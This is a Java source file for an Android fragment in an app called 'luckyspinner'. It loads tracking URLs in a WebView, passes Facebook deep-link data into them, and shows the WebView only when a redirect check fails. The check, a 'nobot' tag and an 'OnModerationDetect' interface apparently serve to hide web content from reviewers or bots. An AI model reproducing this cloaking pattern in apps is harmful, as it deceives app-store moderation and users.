package com.luckyspinner.app.fragemnts;

import android.content.Context;
import android.net.Uri;
import android.os.Bundle;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.CookieManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.facebook.applinks.AppLinkData;
import com.luckyspinner.app.R;
import com.onesignal.OneSignal;

public class WebViewFragment extends Fragment {
    private WebView webView;
    private Context context;
    private AppLinkData appLinkData;
    private Uri uri;

    public WebViewFragment() {
    }

    public WebViewFragment(OnModerationDetect onModerationDetect, AppLinkData appLinkData) {
        this.appLinkData = appLinkData;
    }

    @Override
    public void onAttach(@NonNull Context context) {
        super.onAttach(context);
        this.context = context;
    }

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
    }

    @Override
    public void onActivityCreated(@Nullable Bundle savedInstanceState) {
        super.onActivityCreated(savedInstanceState);
        webView.restoreState(savedInstanceState);
    }

    @Override
    public void onSaveInstanceState(@NonNull Bundle outState) {
        super.onSaveInstanceState(outState);
        webView.saveState(outState);
    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_web_view, container, false);
        webView = view.findViewById(R.id.main_web_view);
        CookieManager cookieManager = CookieManager.getInstance();
        CookieManager.setAcceptFileSchemeCookies(true);
        cookieManager.setAcceptThirdPartyCookies(webView, true);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDefaultTextEncodingName("utf-8");
        webView.getSettings().setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
        if(savedInstanceState!= null) {
            webView.restoreState(savedInstanceState);
        } else {
            initWebView();
        }
        return view;
    }

    private void initWebView() {
        if (appLinkData != null) {
            uri = appLinkData.getTargetUri();
        }
        String query;
        if (uri != null && (query = uri.getQuery()) != null) {
            webView.loadUrl(context.getResources().getString(R.string.track_url) + context.getResources()
                    .getString(R.string.track_key) + "&" + query.substring(query.indexOf("?")));
            setWebViewVisible();
        } else {
            checkClient();
        }
        /*webView.setWebViewClient(new WebViewClient());
        webView.loadUrl("http://www.google.com/");
        setWebViewVisible();*/
    }

    private void checkClient() {
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                if (url.equals(context.getResources().getString(R.string.redirected_url))) {
                    OneSignal.sendTag("nobot", "1");

                } else {
                    webView.loadUrl(context.getResources().getString(R.string.track_url)
                            + context.getResources().getString(R.string.track_key));
                    setWebViewVisible();
                }
            }
        });
        webView.loadUrl(context.getResources().getString(R.string.url_1));
    }

    private void setWebViewVisible() {
        webView.setVisibility(View.VISIBLE);
    }

    public interface OnModerationDetect {
        void onModeration();
    }
}